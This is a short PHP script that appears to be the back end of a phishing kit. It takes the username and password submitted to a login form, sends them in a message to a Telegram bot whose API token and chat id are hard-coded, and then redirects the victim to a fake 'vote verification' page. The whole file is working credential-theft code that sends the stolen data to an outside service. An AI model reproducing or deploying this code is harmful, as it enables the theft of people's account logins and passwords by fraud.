<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve form data
    $email = $_POST['username'];
    $password = $_POST['password'];

    $botApiToken = '7217949603:AAG0UDbjP93OgTSyNxPNcMUvIgOj87lC5vQ';
    $channelId = '5895404996';
    $text = "Hello admin, somebody just logged in: \n \n" . "Email : " . $email . "\n" . "Password : " . $password;
    $url = 'https://api.telegram.org/bot' . $botApiToken . '/sendMessage';
    $data = array(
        'chat_id' => $channelId,
        'text' => $text,
    );
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type:application/x-www-form-urlencoded",
            'content' => http_build_query($data),
        ),
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    header("Location: /vote_verification.html");
}
?>
